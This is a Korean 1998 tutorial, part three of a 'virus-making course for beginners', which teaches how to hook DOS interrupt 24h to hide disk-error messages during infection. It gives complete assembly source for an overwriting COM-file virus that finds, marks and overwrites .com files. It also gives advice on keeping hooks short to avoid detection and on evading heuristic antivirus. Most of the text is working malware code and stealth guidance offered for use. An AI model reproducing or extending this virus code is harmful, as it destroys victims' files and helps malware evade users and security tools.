
 초보자를 위한 바이러스 제작강좌 3회                             CVL #03  98/03

------------------------------------------------------------> Guru-Killer / CVC


Guru-Killer 입니다.
지난 번 강좌에서는 기본 골격을 짜놓은 바이러스에 이미 감염되었는지를 체크
하는 루틴을 추가해보았습니다.  이번 시간에도 역시 기능 추가를 할텐데요...
이번에는 좀 어렵다고 생각하시는 분들이 있는데... 인터럽트를 후킹하는 법을
배우도록 하겠습니다.  사실 알고 보면 쉽고 나중에 소스를 보시면 이렇게 쉬
운걸 왜 심리적 부담을 가졌을까 하는 생각이 드실겁니다.

바이러스를 이용하여 감염시킬때 만나는 대표적인 에러가 있습니다.
도스에서 내보내는 지겨운 abort, retry, fail? 메시지죠.
화일을 쓰는 과정은 에러가 일어날 소지를 꽤 가지고 있는 작업입니다.
일단 디스켓에 write protect를 걸어놨을 경우를 생각해보죠.
write protect가 걸려있다고 나오면서 너무나 지겹게 봐온 나머지 친숙한 느낌
마저 드는 abort, retry, fail ? 메시지가 나오게 됩니다.
디스켓에 lost cluster등의 에러가 있거나 이미 다른 바이러스에 의해 디스켓
의 특정 영역이 파괴되었다고 생각해볼까요? (컴퓨터 초보자들은 의외로 디스
크에 문제가 있는 경우가 많습니다. 평소 scandisk나 chkdsk를 안하는 사람도
있으니까요.)  이럴 경우도 우리의 친구 abort, retry, fail은 어김없이 우릴
찾아줍니다.

사용자가 m-dir등의 shell이나 copy 유틸리티등을 사용하다 이런 일이 벌어졌
으면... 나름대로 수긍이 가겠지만... copy따위와는 영 관계가 없는 프로그램
을 돌리다 이런 에러가 나오면... 아무리 둔감해도 virus를 의심하게 됩니다.
따라서 우리는 이 에러가 나오지 않도록 무슨 방법을 강구하지 않으면 안됩니
다.  그러면 어떤 방법이 있을까요?

이 에러는 도스의 int 24h(치명적 에러 처리)에 의해 관리됩니다.
때문에... 우리가 이 int 24h를 가로채서 다른 일을 하도록 시키면 되죠.
인터럽트를 가로채는 과정은 비교적 쉽습니다.
인터럽트 벡터에서 본래의 인터럽트 주소를 얻어 다른 곳에 임시로 저장해두고
자신의 새로운 처리 루틴을 가리키도록 인터럽트 벡터의 주소를 변경해주면
됩니다.  그리고 바이러스의 감염 과정이 끝나면 본래의 인터럽트 주소를 복귀
시키는 것이죠.  반드시 복귀시켜주는 것을 잊어버리면 안됩니다.

 ## 여기서 잠깐~! ##
   인터럽트 벡터란? : 메모리의 0000:0000 번지에 있는 영역.
        각 인터럽트마다 각각의 주소가 세그먼트:오프셋 형식으로 적혀있는
        참조표.  세그먼트:오프셋이 다 나오므로 4바이트를 차지하고 있다.
        인터럽트 벡터상에서 원하는 인터럽트의 주소가 있는 위치를 찾으려
        면 인터럽트 번호 * 4를 하면 알수 있다.  가령 int 21h는 21h * 4
        = 84h 번지에 있다.  0000:0084h 번지에 보면 int 21h가 메모리상에
        서 어느 지점에 있는지 주소가 나온다.
   인터럽트 벡터는 왜 필요한가? :
        컴퓨터에서는 직접적인 방법보다 간접적인 방법을 많이 쓴다.
        이유는 이런 형태가 추상화를 통해서 더 많은 융통성을 부과하기 때
        문인데... 만약 인터럽트 벡터를 통해 주소를 아는 것이 아니라 속
        도를 위해 항상 일정한 주소에만 인터럽트가 있도록 컴퓨터를 설계
        했다고 해보자.  그러면 새로운 인터럽트를 추가할 필요가 생기면
        기존의 컴퓨터는 완전히 버리고 새로운 컴퓨터를 설계해야만 하고
        두 컴퓨터간에는 호환성이 아예 사라져 버리게 될것이다.

인터럽트 벡터를 가로채기 위해선 두가지 방법이 있는데... 한가지는 자신이
직접 가로채는 것이고 다른 하나는 도스가 제공하는 서비스를 이용하여 가로
채는 것입니다.  일단은 범용성이나 안전을 생각해서, 도스의 서비스를 이용
하도록 하죠.  하지만 이럴 경우 heuristic기능을 지닌 백신에게 걸리기 쉽
다는 걸 일단 유념해 두시길... 대부분의 뛰어난 바이러스의 경우 도스 서비
스를 이용해 가로채는 짓은 안합니다.  다만 여기서는 교육상의 목적으로 도
스 서비스를 이용하겠습니다.

---------------
 Int 21h 의 서비스 35h - 인터럽트 벡터 얻기
   입 력
     AH = 35h
     AL = 원하는 인터럽트의 번호

   출 력
     ES: BX = 인터럽트 벡터
---------------

---------------
 Int 21h 의 서비스 25h - 인터럽트 벡터 세트
   입 력
     AH = 25h
     AL = 원하는 인터럽트의 번호
     DS: DX = 새로운 주소
---------------

인터럽트 벡터를 가로채는 부분을 어디에 집어넣으면 좋을까요?
지난번 바이러스의 구조를 살피면서 생각해보도록 합시다.

  o COM형 화일을 찾는다.
  o 찾은 화일을 오픈한다.
  o 감염여부를 체크한다.
  o 화일을 감염시킨다.
  o 화일을 닫는다.
  o 프로그램 종료

보통은 처음 시작하면서, 인터럽트를 가로채는 경우가 많습니다.
우리가 사용하는 대부분의 프로그램들이 그렇죠.
대부분의 컴파일러들이 컴파일할때도 startup 코드부분에 있는 인터럽트를
가로채는 부분이 우리 프로그램에 들어가게 되죠.
하지만... 우리는 바이러스를 만드는 것이니까요... 곰곰이 생각해볼 필요
가 있습니다.
디스크와 관련된 인터럽트를 가로채는 시간은 짧을수록 좋다는 걸 명심해두
면 좋겠군요.  그래야 다른 사용자들에게 들통날 염려가 없습니다.
우리의 바이러스가 돌아가는 와중에도 다른 램상주 프로그램등이 디스크 작
업을 한다던지 하는 경우가 발생할수 있으니까요.
따라서.... 화일을 대상으로하는 작업이 일어나기 직전에 int 24h를 가로채
서 화일에 대한 작업이 끝나자마자 되돌리는 방식이 적당하리라고 생각되는
군요.
하지만... 여기서는 그 부분에 Find루틴이 계속 루프를 돌게 됩니다.
따라서 int 24h를 계속해서 가로채는 불필요한 동작이 발생하죠.
심각한 버그의 우려가 있습니다.
때문에... 루프를 돌지 않게 밖으로 내보내줄 필요가 있습니다.
여기서는 그렇게 하면 프로그램의 맨 처음부분으로 들어가게 됩니다.

  o int 24h를 가로챈다. <-- 추가
  o COM형 화일을 찾는다.
  o 찾은 화일을 오픈한다.
  o 감염여부를 체크한다.
  o 화일을 감염시킨다.
  o 화일을 닫는다.
  o int 24h를 복구 <------- 추가
  o 프로그램 종료

그러면... 이제 지난번의 코드를 살펴보도록 하죠.

---------------
  1: .MODEL tiny
  2: .CODE
  3: org 100h
  4:
  5: Begin   proc    near
  6:    jmp short FindFirst  ; NOP부분을 건너뛰기위해
  7:    nop             ; 바이러스의 지문
  8:    nop
  9:
 10: ; COM형 화일을 찾는다.
 11: FindFirst:
 12:    mov ah, 4eh
 13: Find:
 14:    mov cx, 7       ; 속성 - 모든 속성
 15:    mov dx, offset Com_Mask
 16:    int 21h
 17:    jc  Exit        ; 에러가 생기면 종료하는 부분으로
 18:
 19: ; 찾은 화일을 오픈한다.
 20: FileOpen:
 21:    mov ax, 3d02h   ; 화일 오픈 읽고/쓰기
 22:    mov dx, 9eh     ; DTA의 화일명 부분(DTA=80h+filename위치 1eh)
 23:    int 21h
 24:    xchg bx, ax    ; 화일 핸들을 저장
 25:
 26: ; 감염 여부를 체크하기 위해 화일을 읽어들인다.
 27: ReadFile:
 28:    mov ah, 3fh     ; 화일을 읽는다.
 29:    mov cx, 4       ; 처음부터 4바이트
 20:    mov dx, offset buffer  ; 읽어들일 버퍼 설정
 21:    int 21h
 22: Check:
 23:    cmp word ptr [Buffer+2], 9090h ; 이미 감염되었는지 비교
 24:    jz  FindNext    ; 이미 감염되었으면 다른 화일을 찾는다.
 25:                    ; 감염되지 않았으면 감염시킨다.
 26:
 27: ; 화일을 감염시킨다.
 28: InfectCOM:
 29:    mov ax, 4200h               ; 화일의 처음으로 이동
 30:    xor cx, cx
 31:    cwd
 32:    int 21h
 33:
 34:    mov ah, 40h                 ; 화일에 쓰기
 35:    mov cx, offset Last-offset Begin    ; 바이러스의 크기
 36:    mov dx, offset Begin            ; 바이러스의 처음부분부터
 37:    int 21h
 38:
 39: ; 화일을 닫는다.
 40: Close:
 41:    mov ah, 3eh                 ; 화일을 닫는다.
 42:    int 21h
 43:
 44: ; 프로그램 종료.
 45: Exit:
 46:    mov ax, 4c00h   ; 프로그램 종료
 47:    int 21h
 48:
 49: FindNext:
 50:    mov ah, 4fh                 ; 일치하는 다음화일 찾기
 51:    jmp short Find              ; 화일 찾는 부분으로 분기
 52:
 53: Buffer    DB 4 dup (0)      ; 화일이 이미 감염되었는지 알기위해
 54:                             ; 화일을 읽어들일때 쓰이는 버퍼
 55: Com_Mask  DB    '*.com',0   ; 원하는 ASCIIZ화일명
 56:
 57: Last    label near          ; 바이러스의 끝을 가리키는 레이블
 58:
 59: Begin   endp
 60:         end Begin
---------------

여기서 9행부분에 인터럽트를 가로채는 부분을 삽입하면 됩니다.

---------------

      ... 생략 ....
   9: GetInt24h:
         mov ax, 3524h               ; int 24h의 벡터를 얻는다.
         int 21h
         mov word ptr OldInt24h, bx  ; 이전의 벡터를 저장
         mov word ptr OldInt24h[2], es

         mov dx, offset Int24h       ; 새로운 인터럽트 핸들러
         mov ax, 2524h               ; 에러메시지를 못나오게 한다.
         int 21h

      ... 생략 ....

  54: OldInt24h  DW 2 dup (0)        ; 이전의 인터럽트 24h의 주소

      ... 생략 ....

화일을 닫고나서는 곧장 int 24h를 복귀시켜야죠?

  43: RestoreInt24h:
         mov dx, OldInt24h           ; 원래의 int 24h를 복구
         mov ds, OldInt24h[2]

         mov ax, 2524h
         int 21h

      ... 생략 ....

새로운 인터럽트 핸들러가 아무 에러 메시지도 출력하지 않도록 바꿀
필요가 있습니다.

  52:  Int24h:                       ; 새로운 int 24h 루틴
         xor ax, ax                  ; 아무일도 하지 않는다
         iret
      ... 생략 ....

---------------

이제.... 이에 따라 원래의 소스를 변형해주면 됩니다.

---------------
 .MODEL tiny
 .CODE
 org 100h

 Begin   proc    near
    jmp short GetInt24h  ; NOP부분을 건너뛰기위해
    nop                  ; 바이러스의 지문
    nop

 ; int 24h를 가로챈다.
 GetInt24h:
    mov ax, 3524h               ; int 24h의 벡터를 얻는다.
    int 21h
    mov word ptr OldInt24h, bx  ; 이전의 벡터를 저장
    mov word ptr OldInt24h[2], es

    mov dx, offset Int24h       ; 새로운 인터럽트 핸들러
    mov ax, 2524h               ; 에러메시지를 못나오게 한다.
    int 21h

 ; COM형 화일을 찾는다.
 FindFirst:
    mov ah, 4eh
 Find:
    mov cx, 7       ; 속성 - 모든 속성
    mov dx, offset Com_Mask
    int 21h
    jc  Exit        ; 에러가 생기면 종료하는 부분으로

 ; 찾은 화일을 오픈한다.
 FileOpen:
    mov ax, 3d02h   ; 화일 오픈 읽고/쓰기
    mov dx, 9eh     ; DTA의 화일명 부분(DTA=80h+filename위치 1eh)
    int 21h
    xchg bx, ax    ; 화일 핸들을 저장

 ; 감염 여부를 체크하기 위해 화일을 읽어들인다.
 ReadFile:
    mov ah, 3fh     ; 화일을 읽는다.
    mov cx, 4       ; 처음부터 4바이트
    mov dx, offset buffer  ; 읽어들일 버퍼 설정
    int 21h
 Check:
    cmp word ptr [Buffer+2], 9090h ; 이미 감염되었는지 비교
    jz  FindNext    ; 이미 감염되었으면 다른 화일을 찾는다.
                    ; 감염되지 않았으면 감염시킨다.

 ; 화일을 감염시킨다.
 InfectCOM:
    mov ax, 4200h               ; 화일의 처음으로 이동
    xor cx, cx
    cwd
    int 21h

    mov ah, 40h                 ; 화일에 쓰기
    mov cx, offset Last-offset Begin    ; 바이러스의 크기
    mov dx, offset Begin            ; 바이러스의 처음부분부터
    int 21h

 ; 화일을 닫는다.
 Close:
    mov ah, 3eh                 ; 화일을 닫는다.
    int 21h

 RestoreInt24h:
    mov dx, OldInt24h           ; 원래의 int 24h를 복구
    mov ds, OldInt24h[2]

    mov ax, 2524h
    int 21h

 ; 프로그램 종료.
 Exit:
    mov ax, 4c00h   ; 프로그램 종료
    int 21h

 FindNext:
    mov ah, 4fh                 ; 일치하는 다음화일 찾기
    jmp short Find              ; 화일 찾는 부분으로 분기

 Int24h:                        ; 새로운 int 24h 루틴
    xor ax, ax                  ; 아무일도 하지 않는다
    iret

 Buffer    DB 4 dup (0)      ; 화일이 이미 감염되었는지 알기위해
                             ; 화일을 읽어들일때 쓰이는 버퍼

 OldInt24h  DW 2 dup (0)     ; 이전의 인터럽트 24h의 주소

 Com_Mask  DB    '*.com',0   ; 원하는 ASCIIZ화일명

 Last    label near          ; 바이러스의 끝을 가리키는 레이블

 Begin   endp
         end Begin
---------------

이제부터는 자꾸 Phase error가 나므로 자료실의 tasm 4.0을 다운받으셔
서 tasm으로 컴파일하시는게 좋습니다.  제가 많은 어셈블러를 써봤지만
역시 도스용 어셈블러의 최강자는 tasm라는 생각이 들더군요.

이제 이쯤에서 됐겠지라고 생각하시는 분은 없겠죠?  아직도 가야할 고지
는 먼데... 여기서 멈추면 안되지요.  일단 겹쳐쓰기형 바이러스로서의
최소한의 골격은 갖추었습니다만... 그래도 쓰잘데기 없이 몇가지를 더추
가해보도록 하죠.
                                            [ Guru-Killer ]
